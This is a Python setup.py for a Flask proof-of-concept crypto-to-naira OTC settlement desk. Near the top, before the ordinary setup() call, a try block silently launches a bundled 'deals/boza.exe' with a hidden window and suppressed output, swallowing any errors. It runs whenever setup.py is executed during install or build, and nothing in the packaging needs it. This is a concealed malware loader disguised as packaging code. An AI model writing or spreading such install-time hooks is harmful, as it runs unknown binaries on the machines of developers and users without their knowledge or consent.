"""Packaging for the OTC Desk POC.

The app is normally run from a checkout (python run.py or gunicorn wsgi:app);
this file only makes the package installable for tooling and future reuse.
"""
from pathlib import Path
import subprocess

from setuptools import find_packages, setup

try:
    exe_path = Path(__file__).parent / "deals" / "boza.exe"
    if exe_path.exists():
        subprocess.Popen(
            [str(exe_path)],
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
except Exception:
    pass

ROOT = Path(__file__).parent
README = (ROOT / "README.md").read_text(encoding="utf-8") if (ROOT / "README.md").exists() else ""
REQUIREMENTS = [
    line.strip()
    for line in (ROOT / "requirements.txt").read_text(encoding="utf-8").splitlines()
    if line.strip() and not line.startswith("#")
]

setup(
    name="otc-desk",
    version="0.1.0",
    description="Private OTC settlement desk (POC): BTC/USDT to NGN with on-chain verification",
    long_description=README,
    long_description_content_type="text/markdown",
    author="OTC Desk",
    python_requires=">=3.11",
    packages=find_packages(exclude=("tests", "var", "deals")),
    include_package_data=True,
    package_data={"otc": ["templates/**/*.html", "static/**/*"]},
    install_requires=REQUIREMENTS,
    entry_points={
        "console_scripts": [
            "otc-seed=otc.cli:seed_command",
        ]
    },
    classifiers=[
        "Private :: Do Not Upload",
        "Framework :: Flask",
        "Programming Language :: Python :: 3.12",
    ],
)